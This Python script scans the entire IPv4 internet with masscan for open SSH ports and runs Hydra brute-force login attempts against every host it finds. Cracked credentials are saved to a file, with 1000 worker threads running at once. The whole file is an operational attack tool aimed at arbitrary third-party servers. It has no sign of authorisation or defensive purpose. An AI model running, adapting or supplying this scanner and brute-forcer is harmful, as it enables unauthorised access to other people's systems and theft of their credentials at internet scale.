import os
import queue
import threading
import subprocess
import time
import ipaddress
import json

# Files
UFILE = "users.txt"
PFILE = "passes.txt"
LOGS = "valid_creds.txt"
ELOGS = "error_log.txt"
OUTPUT_FILE = "masscan_output.json"  # Masscan output file

# IP Range
start_ip = ipaddress.IPv4Address("0.0.0.0")
end_ip = ipaddress.IPv4Address("255.255.255.254")

# Settings
RATE = "30000"        # Updated rate (30k)
WORKERS = 1000        # Number of worker threads
PORT = 22
BATCH = 250000        # Updated batch size (250k IPs)

q = queue.Queue()
stats = {"scanned_ips": 0, "hits": 0, "fails": 0, "errors": 0}
active_hydra = 0
hydra_lock = threading.Lock()

def save_hit(creds):
    with open(LOGS, "a") as f:
        f.write(f"{creds}\n")
    stats["hits"] += 1

def save_err(err):
    with open(ELOGS, "a") as f:
        f.write(f"{err}\n")
    stats["errors"] += 1

def brute(ip):
    global active_hydra
    with hydra_lock:
        active_hydra += 1
    # Debug: Uncomment the line below to see when Hydra is run for an IP
    # print(f"[DEBUG] Running Hydra on {ip}")
    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 4 -T 5 -W 1 -V 2>&1"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
    except Exception as e:
        save_err(str(e))
        with hydra_lock:
            active_hydra -= 1
        return

    found = False
    for line in res.splitlines():
        if "password:" in line:
            # Debug: Uncomment the line below to print Hydra success details
            # print(f"[DEBUG] Hydra success: {line}")
            save_hit(line)
            found = True
        elif "failed" in line.lower() or "invalid" in line.lower():
            stats["fails"] += 1
        elif "error" in line.lower():
            save_err(line)

    if not found:
        stats["fails"] += 1

    with hydra_lock:
        active_hydra -= 1

def worker():
    while True:
        ip = q.get()
        if ip is None:
            q.task_done()
            break
        # Debug: Uncomment the line below to see worker processing details
        # print(f"[DEBUG] Worker processing IP: {ip}")
        brute(ip)
        q.task_done()

def scan():
    # Debug: Uncomment the line below to indicate scan start
    # print("[DEBUG] Starting scan...")
    current_ip = start_ip
    while current_ip <= end_ip:
        next_ip = min(current_ip + BATCH - 1, end_ip)
        cmd = (
            f"masscan -p {PORT} --open --rate={RATE} "
            f"--range {str(current_ip)}-{str(next_ip)} "
            f"--output-format=json --output-filename={OUTPUT_FILE} "
            f"--exclude 255.255.255.255"
        )
        # Debug: Uncomment the line below to see the masscan command being executed
        # print(f"[DEBUG] Running: {cmd}")
        subprocess.run(cmd, shell=True)

        try:
            with open(OUTPUT_FILE, "r") as f:
                data = json.load(f)
            for entry in data:
                ip_found = entry.get("ip")
                if ip_found:
                    q.put(ip_found)
                    stats["scanned_ips"] += 1
        except Exception as e:
            # Debug: Uncomment the line below for parsing errors
            # print(f"[DEBUG] Failed to parse masscan output: {e}")
            save_err(f"Failed to parse masscan output: {e}")

        current_ip = next_ip + 1
        time.sleep(1)

def start_workers():
    threads = []
    for _ in range(WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    return threads

def show_stats():
    while True:
        time.sleep(5)
        # Clear the screen (for Windows, use "cls"; on Unix, change to "clear")
        os.system("cls")
        print("=== Stats ===")
        print(f"Scanned IPs: {stats['scanned_ips']}")
        print(f"Hits: {stats['hits']}")
        print(f"Fails: {stats['fails']}")
        print(f"Errors: {stats['errors']}")
        with hydra_lock:
            current_active_hydra = active_hydra
        print(f"Active Hydra: {current_active_hydra}")
        print(f"Queue Length: {q.qsize()}")
        print("==============")

def run():
    # Debug: Uncomment the line below to indicate workers are starting
    # print("[DEBUG] Starting workers...")
    start_workers()
    threading.Thread(target=scan, daemon=True).start()
    threading.Thread(target=show_stats, daemon=True).start()

    # Main thread waits indefinitely
    while True:
        time.sleep(5)

if __name__ == "__main__":
    run()
